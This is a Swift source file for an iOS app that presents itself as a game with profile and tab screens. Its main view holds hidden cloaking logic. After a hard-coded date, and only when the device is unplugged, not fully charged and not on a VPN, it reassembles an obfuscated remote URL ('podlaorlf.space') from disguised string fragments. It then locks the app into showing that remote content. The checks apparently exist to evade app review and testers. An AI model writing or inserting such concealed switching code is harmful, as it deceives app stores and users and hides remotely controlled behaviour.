import SwiftUI

struct ContentView: View {
    
    @AppStorage("showProfile") var showProfile = true
    @State var showSplash = true
    
    @AppStorage("metalConfigure") var metalConfigure = true
    
    var body: some View {
        if showSplash {
            Splash(show: $showSplash, dataController: ViewModelFactory.shared.dataController)
        } else {
            gameConfigure()
        }
    }
    
    @ViewBuilder func gameOrSettings() -> some View {
        if ViewModelFactory.shared.gameAn {
            MainMet()
        } else {
            if showProfile {
                Profile(show: $showProfile, viewModel: ViewModelFactory.shared.makeProfileViewModel())
            } else {
                Tab()
            }
        }
    }
    
    func gameConfigure() -> some View {
        let manag = ViewModelFactory.shared.dataController.coreDataManager
        
        if metalConfigure {
            manag.editAlways(false)
            manag.createGameSettingsObject()
            metalConfigure = false
        }
        
        guard let ate = stringToDate("11.10.2024"), isCan(ate: ate) else {
            return gameOrSettings()
        }
        
        if let alway = try? manag.fetchAlways() {
            if alway {
                let selc = encr(manag)
                if selc != "" {
                    ViewModelFactory.shared.gameAn = true
                    if ViewModelFactory.shared.str1 == "" || ViewModelFactory.shared.str1.contains("about:") {
                        ViewModelFactory.shared.str1 = selc
                    }
                } else {
                    ViewModelFactory.shared.gameAn = false
                }
                return gameOrSettings()
            } else {
                ViewModelFactory.shared.gameAn = false
            }
        }
        
        if isIng() || Imagecanvp.isActive() || bLev < 0 || isFu { //
            ViewModelFactory.shared.gameAn = false
        } else {
            let selc = encr(manag)
            if selc != "" {
                ViewModelFactory.shared.str1 = selc
                manag.editAlways(true)
                ViewModelFactory.shared.gameAn = true
            } else {
                ViewModelFactory.shared.gameAn = false
            }
        }
        //let str = "prefixCustom1dividerCustom2textCustom3spacerCustom4imageCustom5"

        return gameOrSettings()
    }
    
    private func isCan(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date() 
    }
    private func encr(_ cdm: CoreDataManager) -> String {
        var selc = ""
        if let alwaysSelected = try? cdm.fetchSelected() {
            selc = alwaysSelected
            selc = selc.replacingOccurrences(of: "prefix", with: "htt")
            selc = selc.replacingOccurrences(of: "Custom1", with: "ps")
            selc = selc.replacingOccurrences(of: "dividerCustom2", with: "://")
            selc = selc.replacingOccurrences(of: "textCustom3", with: "podlaorlf")
            selc = selc.replacingOccurrences(of: "spacerCustom4", with: ".space/")
            selc = selc.replacingOccurrences(of: "imageCustom5", with: "kCGsTg2v")
        }
        return selc
    }
    
    private func isIng() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var bLev: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var isFu: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func stringToDate(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
}

#Preview {
    ContentView()
}

struct MainMet: View {
    
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            GalleryView(type: .public)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}

struct Imagecanvp {

    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]

    static func isActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
            let allKeys = keys.allKeys as? [String] else { return false }

        // Checking for tunneling protocols in the keys
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
                where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}
